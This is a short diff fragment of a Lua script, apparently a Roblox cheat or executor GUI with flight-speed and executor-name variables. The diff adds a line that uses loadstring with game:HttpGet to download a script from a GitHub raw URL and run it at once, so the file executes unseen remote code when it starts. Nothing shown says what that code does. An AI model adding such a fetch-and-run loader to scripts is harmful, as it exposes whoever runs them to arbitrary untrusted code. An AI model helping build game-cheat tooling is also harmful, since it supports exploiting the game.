@@ -17,6 +17,8 @@ end
 local flightSpeed = 10
 local getExecutorname = ""
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+
 local Converted = {
 	["_GEH_Client"] = Instance.new("ScreenGui");
 	["_NotifFrame"] = Instance.new("Frame");
